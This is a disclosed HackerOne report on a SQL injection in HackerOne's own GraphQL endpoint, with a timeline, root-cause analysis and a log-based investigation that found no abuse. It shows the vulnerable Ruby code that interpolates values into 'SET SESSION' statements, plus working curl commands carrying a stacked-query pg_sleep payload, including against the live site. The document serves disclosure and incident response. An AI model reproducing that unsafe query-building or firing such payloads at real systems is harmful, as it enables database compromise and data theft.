---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2018-11-30
submitted: 2018-11-06T16:52:08.233Z
bounty_usd: null
votes: 175
cve: []
program: "[[programs/security|HackerOne]]"
reporter: "jobert"
source: "https://hackerone.com/reports/435066"
title: "SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter"
---
# SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 175 | **Program:** HackerOne | **Disclosed:** 2018-11-30

- Report: [https://hackerone.com/reports/435066](https://hackerone.com/reports/435066)
- CWE: SQL Injection
- Submitted: 2018-11-06T16:52:08.233Z

## Report summary

# Summary
The `embedded_submission_form_uuid` parameter in the `/graphql` endpoint was vulnerable to a SQL injection. This allowed an attacker to extract information from the public and secure schema. We have determine that the vulnerability was not exploited. A thorough explanation can be found in the report below.

# Timeline

| **Time (PST)**            | **Action**                                                                          |
|---------------------------|-------------------------------------------------------------------------------------|
| November 6th, 2018 8:04a  | @tomdev notices a `PG::SyntaxError` exception in hackerone.com's backend 🙌           |
| November 6th, 2018 8:04a  | @jjoos alerted InfoSec, people were assigned tasks                                  |
| November 6th, 2018 8:20a  | Root cause was identified and a hot fix was put up for review                       |
| November 6th, 2018 8:52a  | This report was filed to document the vulnerability                          |
| November 6th, 2018 12:42p | A hot fix for the security vulnerability was released                               |
| November 15th, 2018 2:20p | Investigation was concluded and determined that the vulnerability was not exploited |

# Impacted Data
We have determine that the vulnerability was not exploited. A thorough explanation can be found in the report below.

# Root cause
HackerOne.com has a GraphQL endpoint that the frontend uses to query its backend. When the embedded submission form feature was introduced, a design decisions was made to leverage a GraphQL parameter rather than an input field. Input fields are properly sanitized. However, GraphQL parameters, were not. These GraphQL parameters were not designed to take raw user input. Here's the vulnerable piece of code:

```ruby
unless database_parameters_up_to_date
  safe_query = ''

  new_parameters.each do |key, value|
    safe_query += "SET SESSION #{key} TO #{value};" # <-- 😮
  end

  begin
    connection.query(safe_query)
  rescue ActiveRecord::StatementInvalid => e
    # NOTE: when the transaction is aborted, we cannot set or reset any parameters.
    # Changes of previous SET statements are undone as well, so we can safely do
    # nothing here
    raise e unless e.cause.is_a? PG::InFailedSqlTransaction
  end
end
```

The reason why we have to pass down these parameters to the PostgreSQL query level, is because HackerOne.com's database has two separate schemas. The `public` schema, which is where all the data resides and what we call the `secure` schema. The latter is a set of derived views from the `public` schema that returns data based on the currently signed in user (or signed out, for that matter). By default, GraphQL queries the `secure` schema. These derived views are automatically generated based on authorization logic we define in our GraphQL layer. This reduces the changes of information disclosure vulnerabilities, such as IDOR and SQL injections. Even when an attacker were to be able to query the `secure` schema, it'd reduce the number of exposed records significantly.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

The `embedded_submission_form_uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection. Execute the following command to reproduce the behavior:

**Locally**:
```
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

**HackerOne.com**
```
curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

**Additional proof**
```
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(5\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 0% cpu 5.726 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(1\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 2% cpu 1.631 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(10\)%3B--%27
{}curl -X POST   0.02s user 0.01s system 0% cpu 10.557 total
```

## Impact

The SQL injections seems to be executing in the context of the `secure` schema, so impact is currently unknown. However, since an attacker may be able to switch schemas, we should consider this to have a high impact on confidentiality.

## Timeline

- **Report Filed**
- **Report Title Updated**
- **Report Triaged**
- **2018-11-07** @jobert: Yesterday, at 12:42 PM PDT, a patch was released to address the SQL injection. The underlying root cause has not been addressed yet. From our preliminary investigation, it looks like a sanitization step was skipped when converting the GraphQL query into a SQL statement. We will continue to investigation and determine whether this has been abused. The SQL injection can currently not be exploited anymore and we didn't find any other occurrences of the problem.
- **2018-11-07** @jobert: The commit `a6f976743368c29f8b4c0590079808e5583d4fb6` (rH) introduced the `embedded_submission_form_uuid ` parameter in the `/graphql` endpoint. This commit was merged on develop on September 3rd, 2018 and released to production on September 4th, 2018. In order for someone to have exploited this, the request would match `/graphql.*?embedded_submission_form_uuid.*?'`. The load balancer access logs are currently being queried to filter all requests that match this regular expression. We will manually review any matching request to determine whether this has been abused.
- **Not Eligible For Bounty**
- **2018-11-30** @jobert: On November 15th, we concluded the investigation to determine whether this has been abused. The investigation started on November 7th, but was pushed back due to the [SAML JIT incident](/reports/438306). **TL;DR: the SQL injection was not absued**. A more detailed answer can be found below.

Based on the root cause of the vulnerability we identified a number of straightforward identifiers:

 - a `POST` request was made to `/graphql`
 - the `embedded_submission_form_uuid` parameter was passed in the URL or `POST` body (either as JSON or form encoded)
 - the user input must've contained a single quote in order to exploit the vulnerability

These identifiers helped us write a query to extract useful information from our Log Analysis Platform to see whether this was abused. We ran the query on the access logs from September 3rd, 2018 until October 8th, 2018. The query is slightly optimized and it took 00:06:34 to execute (it queries from both the hot and cold storage) and returned 104 matching requests.

**Query**
```
██████████
```

This query filters all requests to the `/graphql` endpoint with an embedded submission form UUID. The regular expression extracts the user input, decodes it, and constructs the executed SQL query. This helped us to immediately see what happened and determine whether someone purposely exploited this. We were also returning some more fields to help us figure out what the user would've seen, such as the HTTP response status code.

Some interesting indicators that helped us here to determine whether this was abused: 

 - the HTTP response status code (`code`) - in most cases it was a non-200 response, indicating that something went wrong. In most cases, this was related to a payload being used that would not work for PostgreSQL
 - the PoC that we developed ourselves executed the `pg_sleep` function - we used the `upstream_response_time`, `executedSqlQuery`, and `code` to determine whether the SQL was actually executed. Of the four `pg_sleep` functions we executed (`pg_sleep(1)`, `pg_sleep(5)`, `pg_sleep(10)`, and `pg_sleep(30)`), three were successful. The last one, with a timeout of 30, returned a 500 Internal Server Error because the backend aborted the request after 28 seconds.
 - in the logs, we found multiple scanners who tried to find a vulnerability. However, the majority of the scanners expect that the injection point is within a `WHERE` clause. In this case, the injection point was within a different context: `SET SESSION <parameter> TO '<injection>'`. Because of this, automated scanners saw 500 Internal Server Errors and (most likely) didn't report a potential SQLi.

The **only** successful requests that were executed were our own `pg_sleep` payloads and came from trusted IP addresses.

Earlier in this writeup, I wrote that one of the indicators was as following:

 - the `embedded_submission_form_uuid` parameter was passed in the URL or `POST` body (either as JSON or form encoded)

The underlying controller used the `params` object, which doesn't care where the user specified the parameter in the `POST` body or a URL (`GET`) parameter. This means that the nginx logs are not enough, as those don't log HTTP body data. The Rails logs do contain this information, but are harder to query, given that it's not in a JSON blob (**action item**: H1's security team prioritized a task to have a separate log pipeline that consists of JSON blogs). We've used the following query to filter the `embedded_submission_form_uuid` parameter from parameters Rails received:

**Query**
```
██████████
```

The result set was actually smaller (73 rows) than the initial results that were returned by the nginx access log query. We've looked into this and determined that not all requests from the load balancer were sent to unicorn and not all of the requests made it to Rails. This was not unexpected because nginx and/or Rack rejected some of the requests. We did not found any indicators that someone moved the parameters to the body. Here are the aggregated log counts per status code, which would also be a good indicator to see if this was abused:

██████████

None of the requests showed any form of exploitation. This is why the team concluded that this wasn't abused.

The main takeaway from the root cause analysis and investigation is the reinforcement that building out an application log pipeline that includes all this information to be able to give an answer faster. The HackerOne security team has since prioritized building out these cohesive logs in a queryable format and has started collecting logs with enough context.

This incident will be played out again early next year as a table-top exercise to see how well we can respond to the same incident, but then with the new logs.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
